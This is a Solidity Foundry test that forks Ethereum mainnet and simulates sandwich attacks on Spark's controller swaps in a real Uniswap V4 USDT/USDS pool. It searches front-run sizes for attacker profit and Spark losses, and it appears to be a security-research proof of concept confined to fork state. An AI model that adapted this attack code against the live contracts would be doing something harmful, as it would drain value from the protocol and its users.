// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {PoolKey} from "../../lib/uniswap-v4-core/src/types/PoolKey.sol";
import {Currency} from "../../lib/uniswap-v4-core/src/types/Currency.sol";
import {IV4Router} from "../../lib/uniswap-v4-periphery/src/interfaces/IV4Router.sol";
import {Actions} from "../../lib/uniswap-v4-periphery/src/libraries/Actions.sol";

interface ILivePositionManager {
    function poolKeys(bytes25 id) external view returns (PoolKey memory);
}
interface ILiveUniversalRouter {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external;
}
interface ILivePermit2 {
    function approve(address token, address spender, uint160 amount, uint48 expiration) external;
}
interface ILiveMainnetController {
    function swapUniswapV4(bytes32 poolId, address tokenIn, uint128 amountIn, uint128 amountOutMin) external;
}
interface ILiveERC20 {
    function balanceOf(address who) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract SparkLiveSandwich is Test {
    address constant CONTROLLER = 0xc953972Cd006d1f12686fd7185c6D443b15900Cd;
    address constant PROXY = 0x1601843c5E9bC251A3272907010AFa41Fa18347E;
    address constant RELAYER = 0x8a25A24EDE9482C4Fc0738F99611BE58F1c839AB;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDS = 0xdC035D45D973e3EC169d2276DDab16f1e407384F;
    address constant ATTACKER = address(0xA771AC);
    address constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    address constant ROUTER = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
    address constant POSITION_MANAGER = 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e;
    bytes32 constant POOL = 0x3b1b1f2e775a6db1664f8e7d59ad568605ea2406312c11aef03146c0cf89d5b9;

    PoolKey key;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        key = ILivePositionManager(POSITION_MANAGER).poolKeys(bytes25(POOL));
        require(keccak256(abi.encode(key)) == POOL, "pool/key mismatch");
        require(Currency.unwrap(key.currency0) == USDT, "unexpected token0");
        require(Currency.unwrap(key.currency1) == USDS, "unexpected token1");

        uint256 usdtSupplyBefore = ILiveERC20(USDT).totalSupply();
        uint256 usdsSupplyBefore = ILiveERC20(USDS).totalSupply();
        // Independent capital and legitimate Spark inventory are synthetically funded ONLY on fork.
        deal(USDT, ATTACKER, 25_000_000e6, false);
        deal(USDS, ATTACKER, 25_000_000e18, false);
        deal(USDT, PROXY, 25_000_000e6, false);
        deal(USDS, PROXY, 25_000_000e18, false);
        assertEq(ILiveERC20(USDT).totalSupply(), usdtSupplyBefore, "USDT supply changed");
        assertEq(ILiveERC20(USDS).totalSupply(), usdsSupplyBefore, "USDS supply changed");

        vm.startPrank(ATTACKER);
        _approveERC20(USDT, PERMIT2, type(uint256).max);
        _approveERC20(USDS, PERMIT2, type(uint256).max);
        ILivePermit2(PERMIT2).approve(USDT, ROUTER, type(uint160).max, uint48(block.timestamp + 1 days));
        ILivePermit2(PERMIT2).approve(USDS, ROUTER, type(uint160).max, uint48(block.timestamp + 1 days));
        vm.stopPrank();
    }

    function _approveERC20(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(ok && (data.length == 0 || (data.length == 32 && abi.decode(data, (bool)))), "ERC20 approval failed");
    }

    function _attackerTrade(address tokenIn, uint128 amountIn) internal returns (uint256 amountOut) {
        address tokenOut = tokenIn == USDT ? USDS : USDT;
        bytes memory actions = abi.encodePacked(uint8(Actions.SWAP_EXACT_IN_SINGLE), uint8(Actions.SETTLE_ALL), uint8(Actions.TAKE_ALL));
        bytes[] memory params = new bytes[](3);
        params[0] = abi.encode(IV4Router.ExactInputSingleParams({
            poolKey: key,
            zeroForOne: tokenIn == USDT,
            amountIn: amountIn,
            amountOutMinimum: 0,
            hookData: bytes("")
        }));
        params[1] = abi.encode(tokenIn, amountIn);
        params[2] = abi.encode(tokenOut, 0);
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(actions, params);
        uint256 beforeOut = ILiveERC20(tokenOut).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        ILiveUniversalRouter(ROUTER).execute(abi.encodePacked(uint8(0x10)), inputs, block.timestamp);
        amountOut = ILiveERC20(tokenOut).balanceOf(ATTACKER) - beforeOut;
    }

    function _victimTrade(uint128 amountIn, bool inUSDS) internal returns (uint256 amountOut) {
        address inToken = inUSDS ? USDS : USDT;
        address outToken = inUSDS ? USDT : USDS;
        uint256 minOut = inUSDS
            ? uint256(amountIn) / 1e12 * 998 / 1000
            : uint256(amountIn) * 1e12 * 998 / 1000;
        uint256 beforeOut = ILiveERC20(outToken).balanceOf(PROXY);
        vm.prank(RELAYER); // Only the victim is authorized; attacker NEVER impersonates this role.
        ILiveMainnetController(CONTROLLER).swapUniswapV4(POOL, inToken, amountIn, uint128(minOut));
        amountOut = ILiveERC20(outToken).balanceOf(PROXY) - beforeOut;
        require(amountOut >= minOut, "victim minimum not met");
    }

    function baseline(uint128 victimAmount, bool inUSDS) external returns (uint256) {
        require(msg.sender == address(this));
        return _victimTrade(victimAmount, inUSDS);
    }

    // Returned PnL and victim output use micro-dollar (1e6) units, assuming both tokens trade near par.
    function attack(uint128 victimAmount, uint128 frontAmount, bool inUSDS)
        external returns (int256 pnlMicroUSD, uint256 victimOutMicroUSD)
    {
        require(msg.sender == address(this));
        address attackToken = inUSDS ? USDS : USDT;
        address reverseToken = inUSDS ? USDT : USDS;
        uint256 usdtBefore = ILiveERC20(USDT).balanceOf(ATTACKER);
        uint256 usdsBefore = ILiveERC20(USDS).balanceOf(ATTACKER);
        uint256 outFromFront = _attackerTrade(attackToken, frontAmount);
        uint256 victimOut = _victimTrade(victimAmount, inUSDS);
        require(outFromFront <= type(uint128).max, "reverse too large");
        _attackerTrade(reverseToken, uint128(outFromFront));
        uint256 usdtAfter = ILiveERC20(USDT).balanceOf(ATTACKER);
        uint256 usdsAfter = ILiveERC20(USDS).balanceOf(ATTACKER);
        int256 pnl18 = (int256(usdtAfter) - int256(usdtBefore)) * 1e12
                     + (int256(usdsAfter) - int256(usdsBefore));
        pnlMicroUSD = pnl18 / 1e12;
        victimOutMicroUSD = inUSDS ? victimOut : victimOut / 1e12;
    }

    function testLiveProductionSandwichSearch() public {
        // Real deployment, latest block, real pool and rate-limit state.
        // Synthetic balances; the attacker has NO controller permissions.
        uint256[4] memory victims = [uint256(1_000_000), uint256(1_000_000), uint256(5_000_000), uint256(25_000_000)];
        bool[4] memory directions = [false, true, true, true];
        uint256[4] memory fronts = [uint256(10_000), uint256(50_000), uint256(200_000), uint256(1_000_000)];
        uint256 successes;
        uint256 positive;

        for (uint256 i; i < victims.length; ++i) {
            uint128 amountIn = uint128(victims[i] * (directions[i] ? 1e18 : 1e6));
            uint256 minOutMicro = victims[i] * 998 / 1000;
            uint256 baseSnap = vm.snapshotState();
            uint256 baselineOutput;
            try this.baseline(amountIn, directions[i]) returns (uint256 output) {
                baselineOutput = directions[i] ? output : output / 1e12;
            } catch {
                console2.log("BASELINE_FAILED direction_USDS", directions[i]);
                console2.log("victim_usd", victims[i]);
                vm.revertToState(baseSnap);
                continue;
            }
            vm.revertToState(baseSnap);

            console2.log("--- Victim USDS input", directions[i]);
            console2.log("Victim USD", victims[i]);
            console2.log("Baseline output microUSD", baselineOutput);
            console2.log("Protocol floor microUSD", minOutMicro * 1e6);

            for (uint256 j; j < fronts.length; ++j) {
                uint128 frontAmount = uint128(fronts[j] * (directions[i] ? 1e18 : 1e6));
                uint256 snap = vm.snapshotState();
                try this.attack(amountIn, frontAmount, directions[i]) returns (int256 pnl, uint256 actualOut) {
                    ++successes;
                    int256 victimLoss = int256(baselineOutput) - int256(actualOut);
                    console2.log("front_USD", fronts[j]);
                    console2.log("attacker_PnL_microUSD_before_gas", pnl);
                    console2.log("Spark_extra_loss_microUSD", victimLoss);
                    if (pnl > 0 && victimLoss > 0) {
                        ++positive;
                        console2.log("CANDIDATE: attacker profit and Spark victim loss");
                    }
                } catch {
                    console2.log("scenario_reverted_front_USD", fronts[j]);
                }
                vm.revertToState(snap);
            }
        }
        console2.log("Successful complete sandwich sequences", successes);
        console2.log("Profitable candidates before gas", positive);
        console2.log("ALL ACTIONS ARE LOCAL FORK STATE ONLY");
    }
}